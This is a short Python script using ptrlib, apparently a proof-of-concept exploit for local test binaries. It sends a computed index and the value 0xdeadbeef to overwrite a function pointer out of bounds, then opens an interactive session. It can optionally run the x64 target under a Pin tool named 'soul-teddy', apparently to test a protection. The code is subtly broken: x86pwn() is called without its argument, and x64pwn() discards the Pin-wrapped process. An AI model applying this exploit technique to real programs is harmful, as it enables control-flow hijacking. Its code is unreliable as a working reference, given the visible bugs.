from ptrlib import *
import os
import sys

x86target = 0xdeadbeef
x64target = 0xffffffffdeadbeef

x86cmd = ['./x86.out']
x64cmd = ['./x64.out']

def x86pwn(p):
    elf = ELF('./x86.out')
    p.sendline(str((elf.symbol('a') - elf.symbol('f')) // 4))
    p.sendline(str(u32(p32(x86target), signed=True)))
    p.interactive()

def x64pwn(p):
    elf = ELF('./x64.out')
    p = Process(x64cmd)
    p.sendline(str((elf.symbol('a') - elf.symbol('f')) // 8))
    p.sendline(str(u64(p64(x64target), signed=True)))
    p.interactive()

if __name__ == '__main__':
    PATH = os.getenv('PATH', '')
    PATH = os.getenv('PIN_ROOT', './') + ':' + PATH
    if len(sys.argv) < 2:
        print(f"[-] Usage: {sys.argv[0]} [x86|x64] [pin]")
    else:
        if sys.argv[1] == 'x86':
            p = Process(x86cmd)
            x86pwn()
        elif sys.argv[1] == 'x64':
            if len(sys.argv) > 2 and sys.argv[2] == 'pin':
                p = Process(['pin', '-t', '../../dist/soul-teddy', '--'] + x64cmd,
                            env={'PATH': PATH})
            else:
                p = Process(x64cmd)
            x64pwn(p)
        else:
            print("[-] Set 'x86' or 'x64'")
